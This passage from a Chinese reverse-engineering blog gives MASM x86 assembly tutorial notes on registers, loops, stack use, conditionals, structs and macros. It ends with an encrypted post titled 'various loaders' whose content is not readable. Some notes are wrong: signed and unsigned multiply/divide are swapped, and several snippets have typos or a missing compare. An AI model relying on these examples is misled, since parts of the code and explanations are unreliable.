class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">INCLUDELIB kernel32.lib<br>INCLUDELIB user32.lib<br> <br>.386<br>.model flat,stdcall<br> <br>MessageBoxA PROTO,<br>hwnd:DWORD,<br>lpText:DWORD,<br>lpCaption:DWORD,<br>uType:DWORD<br> <br>ExitProcess PROTO,<br>dwExitCode:DWORD<br> <br>.data<br>msg byte <span class="hljs-string">&#x27;Hello,Assembly!&#x27;</span><br> <br>.code<br>main Proc<br>mov eax,offset msg<br>push 0h<br>push 0h<br>push eax<br>push 0h<br>call MessageBoxA<br>push 0h<br>call ExitProcess<br>main endp<br>end main<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/acf89f3c32aa45e3a53afd93465365b0.png" alt="在这里插入图片描述"></p><p>这里记录一个坑点，我本来得用的vs2019但是搭建汇编环境死活有问题，最后换了vs2017一配置立马ok</p><ul><li><strong>三类： 通用寄存器、专用寄存器、段寄存器</strong></li></ul><p>1.通用寄存器<br>数据寄存器:ax、bx、cx、dx<br>ax:作为累加器使用，是算术运算的主要寄存器<br>bx:可以作为通用寄存器，此外在计算储存地址时，它经常用作基址寄存器<br>cx:可以作为通用寄存器，此外在循环和串处理指令中作隐含的计数器<br>dx:可以作为通用寄存器，在作双字长运算时用来存放高位字</p><p>2.专用寄存器<br>IP:为指令指针寄存器，用来存放代码段中的偏移地址，在程序运行过程中，它始终指向下一条指令的首地址，它与cs寄存器联用确定下一条指令的物理地址<br>SP:为堆栈指针寄存器<br>PSW:程序状态字寄存器。由条件码标志、控制标志和系统标志构成</p><p>3.段寄存器<br>代码段CS:存放当前正在运行的程序<br>数据段DS:存放当前运行程序所用的数据<br>段栈段SS:定义来堆栈的所在区域。堆栈一种数据结构，它开辟了一个比较特殊的存储区，并以后进先出的方式来访问这一区域<br>附加段ES:是附加的数据段，它是一个辅助的数据区，也是串处理指令的目的操作数存放区</p><p>数据类型<br><img src="https://img-blog.csdnimg.cn/988a0e70463b4f4e90b634d306206428.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/50e6435b10954c6e900bbb7fc37f58d6.png" alt="在这里插入图片描述"></p><ul><li><strong>offset</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>szStr db <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br>num dword <span class="hljs-number">5</span><br>arrNum DWORD <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br>var1 db ?<br>.code<br>main proc<br>mov eax,offset arrNum + <span class="hljs-number">4</span><br>mov eax,[eax]<br>mov eax,<span class="hljs-number">7</span><br>add ebx,<span class="hljs-number">6</span><br>sub eax,ebx<br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>jmp和loop</strong><br>jmp<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br><br>.code<br>main proc<br><span class="hljs-keyword">xor</span> eax,eax<br>lp:<br>inc eax<br>jmp lp ;跳转到lp处继续执行<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>loop<br>可以规定循环次数<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br><br>.code<br>main proc<br><span class="hljs-keyword">xor</span> eax,eax<br>mov ecx,<span class="hljs-number">10</span> ;规定执行的次数<br>lp:<br>inc eax<br>loop[ lp ;跳转到lp处继续执行<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>复制字符串</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>source byte <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br><span class="hljs-function">target byte <span class="hljs-keyword">sizeof</span> source <span class="hljs-title">dup</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function">.code</span><br><span class="hljs-function">main proc</span><br><span class="hljs-function">mov esi,0</span><br><span class="hljs-function">mov ecx,<span class="hljs-keyword">sizeof</span> source</span><br><span class="hljs-function">lp:</span><br><span class="hljs-function">mov al,source[esi]</span><br><span class="hljs-function">mov target[esi],al</span><br><span class="hljs-function">inc esi</span><br><span class="hljs-function">loop lp</span><br><span class="hljs-function">push <span class="hljs-number">0</span></span><br><span class="hljs-function">call ExitProcess</span><br><span class="hljs-function">add esp,<span class="hljs-number">4</span></span><br><span class="hljs-function">main ENDP</span><br><span class="hljs-function">END main</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>-<strong>栈、堆操作</strong><br>栈 ：<br>先进后出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>source byte <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br>sourcesize=($-source)<span class="hljs-number">-1</span> ;获取source字符串长度<br>.code<br>main proc<br>mov ecx,sourcesize<br>mov esi,<span class="hljs-number">0</span><br>l1:<br>movzx eax,source[esi]<br>push eax<br>inc esi  ;inc 对指定操着数+<span class="hljs-number">1</span>处理<br>loop l1<br>mov ecx,sourcesize<br>mov esi,<span class="hljs-number">0</span><br>l2:<br>pop eax<br>mov source[esi],al<br>inc esi<br>loop l2<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>定义函数</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addx proc uses esi ecx  ;定义函数<br>add esi,ecx<br>mov eax,esi<br>ret  ;返回值<br>addx endp<br><br>main proc<br>mov esi,<span class="hljs-number">5</span><br>mov ecx,<span class="hljs-number">6</span><br>push esi<br>push ecx<br>call addx<br>INVOKE ExitProcess, <span class="hljs-number">0</span><br>main ENDP<br></code></pre></td></tr></table></figure><ul><li><strong>循环</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">main proc<br>mov eax,o1<br>mov eax,o2<br>jnz L1 ;如果相等就向下执行，如果不相等就指定L1处<br>mov x,<span class="hljs-number">1</span><br>mov y,<span class="hljs-number">1</span><br>L1:<br>push <span class="hljs-number">0</span><br>call  ExitProcess<br>add exp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">main proc<br>mov eax,o1<br>mov eax,o2<br>jnz L1<br>mov x,<span class="hljs-number">1</span><br>mov y,<span class="hljs-number">1</span><br>jmp L2 ;执行完跳转到l2处<br>L1:<br>mov x,<span class="hljs-number">2</span><br>mov y,<span class="hljs-number">2</span><br>L2:<br>push <span class="hljs-number">0</span><br>call  ExitProcess<br>add exp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>条件控制</strong><br>if<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.endif ;<span class="hljs-keyword">if</span>条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>if-else</li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.else<br>dec eax<br>.endif ;条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>if-elseif-else</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.elseif eax &lt; i<br>add eax,<span class="hljs-number">2</span><br>.else<br>dec eax<br>.endif<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>while</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">102</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.while eax &lt; i  <br>inc eax<br>.endw ;条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>do..while</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.repeat<br>inc eax<br>.until eax &gt; <span class="hljs-number">105</span><br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>乘法</strong></li></ul><p>有符号  mul  div<br>无符号  imul  idiv</p><p>乘数bl bx ebx<br>被乘数 al ax eax</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">main proc<br>mov al,<span class="hljs-number">5</span>h<br>mov bl,<span class="hljs-number">10</span>h<br>mul bl<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br></code></pre></td></tr></table></figure><ul><li><strong>结构与宏</strong><br>结构体：</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br><br>iDea <span class="hljs-keyword">struct</span>  ;声明结构体<br>sd1 dword ?<br>sd2 dword ?<br>iDea ends<br><br>.data<br>myiDea iDea &lt;&gt;<br>.code<br><br>main proc<br>mov myiDea.sd1,<span class="hljs-number">1</span><br>mov eax,myiDea.sd1<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>宏:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br><br>iDea macro <span class="hljs-type">char</span>;定义宏<br>mov eax,<span class="hljs-type">char</span><br>endm<br><br>main proc<br>iDea <span class="hljs-number">9</span><br>mov eax,eax<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各类Loader</title>
    <link href="/2022/06/16/%E5%90%84%E7%B1%BBLoader/index/"/>
    <url>/2022/06/16/%E5%90%84%E7%B1%BBLoader/index/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="b1789c53f4108a9202178b4c6cf251a40a94a41d33cf0cb0ae08c3b76f77f04f">2713301b30d54682598aa2e6ff3844e0a14d05ccd6e501645ce574ce59d2a42fb36ebc83f48f7ee861aafa6ba6bb05888bb2469672780379f39fe34d7edc7cbbc124a4d513f296f10a32b6308f6baef9cd4838acd07b2c1f1b66b5d37eecf2b439463e87f7b3c247dd7a582871bcbb6926aa763d9710fb4ce216b719d94bf5f5f873b952f6abee3e22636e21497f191b734972a30d38791ab513f559aee7e22bdbc2eac7b3cd4ce7400df42d25cacce78e7a8118d9032a146c83ab6e29cd1ab000fb1e5dfa03193e78915f59f5e413f3abe36b6ecfcaa43b8279f6ca16e0e94ece49951c84d323101c2935a82bed6069ea298850ac9d011587e6a3a326438f6ad0957d6c9cd624a48105dd1e46a42974efa5297811c4723b790ba3ee79060b4b60528d216f167b8daa8778ab6c77474f7a072bb92d3d63389c8341f5837cc3fa9650d4c7ae2554d9d7155f8fb293b317fbf498622f83442c232dc9989abe040a22121d9ebf3113bddf2fde16d183a5716d9b9cfea07a8686a6d802477901081c3250966a8da4d657a930786d762484929494b7dfcebf9152d1b383412565f014de343716cda9b57f27dd0b512378a9d8a0b528bdfdd36736ccacab963f9df3aec9547f420fc6ebcc3f0a1b9fade273d709c3cfe874187df141ec49b183cf70b3a5be129817d6279c9e8b04f391168effb82975bfb64e9a5b2e23ea74594bd9c3d2f36ab8442a725a075b4c2d83f2163f2fab74702cbf5347342715369848cdf039d620680b4230d5616f12d8486c8a7c7e37a2e0e41bf2c8780ad3c9bd6c43b14244fb091fae90aa2ab83e71064ea3bd16a7af760d1f0e72b876b3f85c86b13576a37413888a1757d77f4aef5d20c8ea95faadf9368f19f37787123a22d3754b27d8c3da8b938ab85f3c8ea0bfb6a3a15bb2d79ab40877fb6b2463902f6af3d2ea40b740b607ea07e88049727088fba6a8e89ea8dd14d0c27ab2b3f9a1c9816f71a529eda6f9daee864fb9c1ff67791609dc23b2b836407a50236d6fc3d3def9e3f0204b5445db6162340104d19dc4530dd8823240a247da426563dd0e07ff9e789b3605b292fc9eb6b7e3320f37f3fdf53ec6459b83af5cdd94ec92a8568f1cc580485ad6aa158f5b7de317a2e5b44e1e49c8c1cbdc75df6fdea640aab8380ae5d2360fec4fd272a7aefe0dc51cd2e0664e2a57c9da0e213cc76a9cb68c020e0722e7e79a7312ac31ac2936a02f8349a88f54556e12521d7ac53fa812448938bdadc0a2cc420ea63ddfb79dacb18dec39d4ecaeff122751b26d0aff7f6d33fd3993ae7c8f3ab890fd28088e5ed4ccd189d67f219c2d5a2d0e10c59602e77a57f24e77e9c7e80e5e9ceb116707c7920861f24bfaa507ac48fdf228d61a589c0280091548b4a965f8b03fba6ad6b9d82abf8d4d69f4dc9aebaeb539fc1adc1fea10af6a9fa50ceaf3cfdfbb8fe72557941a599af55d843d5c43498dc4e83c3cedb659cc4fa017be9c10fd6b3be1bcad5e1a87b32b163a9122929199a47e6ed716dd7c036f2d438911e802a9d8e170e819b68aa4e1149fa8e0c9d452969800c1b3dfa06ef222b3dfd4619aca12b95765ecf23640f16965689a532ed658314adf4dc247e95bd5f42e69e70e3bfc193b33480b64eeffb40dfd44768e6acbbbd1f6e4b566d44b0e2ca6d5e4a7a74f7273e49473ec652dbb754c950a0dffe617854a584425fa7464f70b49782779cf1a4e0fc7e9d743b799524d413a32663b2b6188e517e5c932ba1e5b8d65e3aaecd71f445459cf3b08603ae4cf2df8c2d6e1995b60845135553f1441b7ba3155209009ad7c2fd0f62335338ff22c71e93f31c66f368facfe733ca271091e8540620083d681fe9be5322685fe766e4894b35d7c01e5fbb1f0254328898ee007bb66acfd852ae6992fb8046b069acbf28312100593ed1630212c6ac7fc5678801140eec20f018b32027d44c940a4abfc8002a7fdcf25665b52e456bb0edf69c09ef60d72bf30b135436660d76fe837ef1d427814adbc5e97024f04a9dc8ee13ef3c54f1d7f418a12f30aa7a8c14c7240573ae45b2d2b49f94720a3e46022de6852f28e87eb748bfe2df5591c8a452f0d6e30321969fa6c60d4802f60aec9cced8191bc73b709044cf5ac0e9f5bb77b3aa9cd473f9c1ff9ee7057ac217d279a6302afd11480efc1deaa8795e29cbb7452bf86a119376905e3ad1294362871f8c921bb5cb8700d26c8d68715b06b88fd0a1a77b7c027e07b9604bec864b97da500d704932cc806c0d1267daa958a9d6a44d72895b60117697eda1bdc328724ac6ba26380aa98a9fa77132b4f26f86f80c88138c55a201b35758e14fee48382ba2fff139a8eccba49ac0691ba550edd8dcee8baaf832e96ebda67a948d4d22deff465fa848e485ce2b38f74808e913b5ed295c0c0e4fbed7953688274e4471a377732315366a213dfb2b0a0c43e13f0c03f487b856b49b042500817f33b3070f753134e72349a3d01e0c313e7cf3c6da4819f3ba8453d2f9a7901a51c8ab13e0be8fa7e030b654fcbd1dbab0a542a1209032d564bdd4ee2c89850e82ab83fc339b353daf60d37c0119ee636005b6ef47c2c6993e117bd725f59949c130943fb5625bf1a1ba0d686d8e163a1cf7b53af37b8f95fcf41e47497576841bef681d55aa71e0d72a278658e8246fb5d7dce4a6cc9348a6a31511fd6a9f9aca13bd00a8fab33b3fba961c2f44abb63a8df0887656f1ff3c8d2bf49f4c4fcd39e0611db1d10450bf35d42bf4a89bd77f50e193081cd388d21e003d2a7b52b7da4b3498bdc1cbf397e0e017b39b6bf82e2518c4e10953f3a325546c6dad1801db8b718889b1eba98ce198a9167623f4fc3d9223a0c5e7097af54fdbd6f692fee4a9533bdee5b28077a9e9775a406ac9140b76aa1aaf21a11ec241d1a7a55a2a5db3916eb415e647fdb0e8ebd3de35f702e4cd18bf4d7f2dcc33fe5aa5ba1b74edc0bfa22246ab8c3a77049761b0dd238bd767ec429aa2cc1d2fa4b92a8a884b114aeb6c6e25fc9467da3172d8784c205f7b2a1e117ca305d81f508c3b0e62ff59ec275a12ef6c785a72be0f311945d230328fc316d50f6e970bb04f04a593bccdf9e8e0f045e5eb2d6638fe1a685c0d1ea20ddd2b1c9fbc7f5478f2adfa2cfbe77904dff965d6394e09409c158bb4248a41fd07822a248859e4671cfc7897f0788881746a46b4cc81be1c9299fdb9a1c54138f65ca33a694d98c400137a6a37acbca7e92768522d123816187cdff31dddad890b39e7c97bdd0f76e48ad5e50e7eb42722044f9e17da54cec1d5f33e9bd95323de024fcc9a5d1d733fa1b11d08d6d26fd47f41a3b93b825b8a107940c7f815074585b9656f91e85e15f5a79ddd6b19dc7401c87b894b2f0ecc058416b70f2b92a8771c0062d292ea0a9d0893fdc58c2aa3e58f09651375a73bc87500d70573f1d81adc7ed18eaacf1084b4a01dc90de80ea7962abbb7dae31001cbd5cb303938c02b7a51264109101a97c7491ba5416a9e869c3392e2c92d630c9903f2a1dca94b661bde64c59c3003cc811dc3b3f3258fad5289990882bd4b9528d81df87af64e46d8c87d37e295b5cfd9fe287b8b57b70d63af06e9b3bfe44baefdf0156f9b832e577764fdc64071a1bdbe1d4d96fe382083b714439d93c0cd3ad9b25c0b1a4c62323ee212154f8a82ddbeecdcb1f2454058e32e0690b3fefa44951f0d08d8b1389c1746be441e19aa528f716e08759a7e96f4ee793f1a16eb24129a6f05217be09e92270592516f1a090c79e5291c96f8a0ff83166bd40b58108be35366fd2ed3a8ec01fe6fd9325c0bdb41fa48c08ce326d0acbf5560396dd6948538e38167935a77831e40d37274408d641a